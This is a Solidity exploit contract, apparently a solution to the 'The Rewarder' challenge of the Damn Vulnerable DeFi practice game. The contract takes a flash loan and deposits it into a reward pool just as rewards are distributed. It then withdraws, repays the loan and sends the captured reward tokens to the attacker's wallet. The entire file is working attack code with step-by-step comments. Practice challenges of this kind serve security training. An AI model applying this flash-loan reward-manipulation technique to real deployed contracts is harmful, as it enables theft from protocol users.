// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { FlashLoanerPool } from "./FlashLoanerPool.sol";
import { TheRewarderPool } from "./TheRewarderPool.sol";
import { RewardToken } from "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract HackTheRewarder {
    FlashLoanerPool flashLoan;
    TheRewarderPool pool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(FlashLoanerPool _flashLoan, TheRewarderPool _pool, DamnValuableToken _liquidityToken, RewardToken _rewardToken) {
        flashLoan = _flashLoan;
        pool = _pool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function hack(uint amount) public {
        // We're going to call the flashLoan function inside the FlashLoanerPool contract
        flashLoan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        // Once we receive the loan, we're going to approve the rewarderPool to use our liquidity tokens
        liquidityToken.approve(address(pool), amount);
        // Then, we're going to deposit our tokens in the pool
        pool.deposit(amount);
        // Once ours liquidity tokens are deposited, it's going to distribute the rewards
        // We're going to withdraw our liquidity tokens
        pool.withdraw(amount);
        // We're transfer back the liquidity tokens to the FlashLoanerPool
        liquidityToken.transfer(msg.sender, amount);
        // Then, we transfer the reward tokens to our EOA
        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
    }

}